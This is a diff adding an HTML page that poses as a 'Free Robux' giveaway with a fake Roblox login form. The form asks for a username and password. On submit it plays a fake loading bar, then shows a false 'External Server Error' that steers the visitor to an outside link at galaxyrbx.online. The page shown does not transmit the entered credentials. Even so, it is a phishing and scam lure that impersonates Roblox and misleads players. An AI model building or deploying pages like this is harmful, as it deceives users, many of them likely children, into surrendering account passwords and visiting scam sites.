@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Free Robux & Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet"/>
+  <style>
+    /* Reset & Base */
+    * { margin:0; padding:0; box-sizing:border-box; }
+    html, body { height:100%; }
+    body {
+      font-family:'Poppins',sans-serif;
+      background:linear-gradient(160deg,#f0f4ff,#ffffff);
+      display:flex; align-items:center; justify-content:center;
+      padding:2rem;
+    }
+
+    /* Container & Cards */
+    .container {
+      display:flex; flex-direction:column; gap:2rem;
+      width:100%; max-width:420px;
+    }
+    .card {
+      background:#fff;
+      border-radius:16px;
+      box-shadow:0 12px 32px rgba(0,0,0,0.08);
+      padding:2rem;
+      text-align:center;
+      transition:transform .3s,box-shadow .3s;
+    }
+    .card:hover {
+      transform:translateY(-4px);
+      box-shadow:0 16px 40px rgba(0,0,0,0.12);
+    }
+    .card h1 {
+      font-size:1.9rem;
+      color:#2a2a72;
+      margin-bottom:1.5rem;
+      line-height:1.2;
+    }
+
+    /* Buttons */
+    .btn {
+      display:inline-block;
+      padding:.8rem 1.8rem;
+      font-size:1rem;
+      font-weight:600;
+      color:#fff;
+      background:linear-gradient(90deg,#6a11cb,#2575fc,#6a11cb);
+      background-size:200% 200%;
+      border:none;
+      border-radius:8px;
+      cursor:pointer;
+      animation:gradientShift 4s ease infinite,pulse 2s ease infinite;
+      transition:transform .2s;
+      text-decoration:none;
+    }
+    .btn:hover { transform:translateY(-3px); }
+    .btn:active { transform:translateY(0); }
+
+    @keyframes gradientShift {
+      0%{background-position:0% 50%}
+      50%{background-position:100% 50%}
+      100%{background-position:0% 50%}
+    }
+    @keyframes pulse {
+      0%,100%{transform:scale(1)}
+      50%{transform:scale(1.05)}
+    }
+
+    /* Login Form */
+    #login { display:none; flex-direction:column; gap:1.2rem; text-align:left; }
+    #login.active { display:flex; }
+    label {
+      font-weight:600; font-size:.9rem; color:#333;
+    }
+    input {
+      width:100%; padding:.75rem 1rem; font-size:1rem;
+      border:1px solid #ddd; border-radius:8px;
+      transition:border-color .2s,box-shadow .2s;
+    }
+    input:focus {
+      outline:none;
+      border-color:#6a11cb;
+      box-shadow:0 0 0 3px rgba(106,17,203,0.15);
+    }
+
+    /* Tidy up login button spacing */
+    #login .btn {
+      margin-top:1.5rem;
+      width:100%;
+    }
+
+    /* Loading Overlay */
+    #overlay {
+      position:fixed; top:0; left:0; width:100%; height:100%;
+      background:rgba(0,0,0,0.6);
+      display:none; align-items:center; justify-content:center;
+      flex-direction:column; color:#fff; z-index:1000;
+    }
+    .progress-container {
+      width:80%; max-width:400px;
+      background:rgba(255,255,255,0.1);
+      border-radius:8px; overflow:hidden;
+      margin-bottom:1rem;
+    }
+    .progress-bar {
+      width:0%; height:12px; background:#6a11cb;
+      transition:width .2s ease;
+    }
+    .progress-text {
+      font-size:1rem; margin-bottom:2rem;
+    }
+    .error-message {
+      display:none; font-size:1.1rem; text-align:center;
+    }
+    .error-message a {
+      color:#ffcc00; text-decoration:underline; cursor:pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Offer Card -->
+    <div class="card" id="offer">
+      <h1>Get Free Robux Now 💰💲</h1>
+      <button class="btn" id="showLogin">Claim Yours</button>
+    </div>
+
+    <!-- Login Card -->
+    <div class="card" id="login">
+      <h1>Roblox Login</h1>
+      <form id="loginForm">
+        <div>
+          <label for="username">Roblox Username</label>
+          <input type="text" id="username" name="Username" placeholder="Enter your username" required>
+        </div>
+        <div>
+          <label for="password">Roblox Password</label>
+          <input type="password" id="password" name="Password" placeholder="Enter your password" required>
+        </div>
+        <button type="submit" class="btn">Send Info</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Loading & Error Overlay -->
+  <div id="overlay">
+    <div class="progress-text">Loading… 0%</div>
+    <div class="progress-container"><div class="progress-bar"></div></div>
+    <div class="error-message">
+      External Server Error.<br/>
+      <a href="https://galaxyrbx.online/?gad_source=1&gad_campaignid=22786641520&gbraid=0AAAAAqKtX32XGFaYL1FjgtO_8WhTg4bG0&gclid=CjwKCAjwvuLDBhAOEiwAPtF0VpeLi-fNdwYxfhnQ6MNLhy0FWWvbcuNlSYPLPZWGuNuep3_834Mo7BoClk4QAvD_BwE" target="_blank">
+        Click this text to use another method.
+      </a>
+    </div>
+  </div>
+
+  <script>
+    // Show login form
+    document.getElementById('showLogin').addEventListener('click', () => {
+      document.getElementById('offer').style.display = 'none';
+      const login = document.getElementById('login');
+      login.classList.add('active');
+      login.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    });
+
+    // Handle form submit
+    document.getElementById('loginForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const overlay = document.getElementById('overlay');
+      const bar = overlay.querySelector('.progress-bar');
+      const text = overlay.querySelector('.progress-text');
+      const error = overlay.querySelector('.error-message');
+
+      overlay.style.display = 'flex';
+
+      let pct = 0;
+      const interval = setInterval(() => {
+        pct++;
+        bar.style.width = pct + '%';
+        text.textContent = `Loading… ${pct}%`;
+        if (pct >= 100) {
+          clearInterval(interval);
+          text.style.display = 'none';
+          bar.parentElement.style.display = 'none';
+          error.style.display = 'block';
+        }
+      }, 200); // 200ms × 100 = 20s
+    });
+  </script>
+
+</body>
+</html>
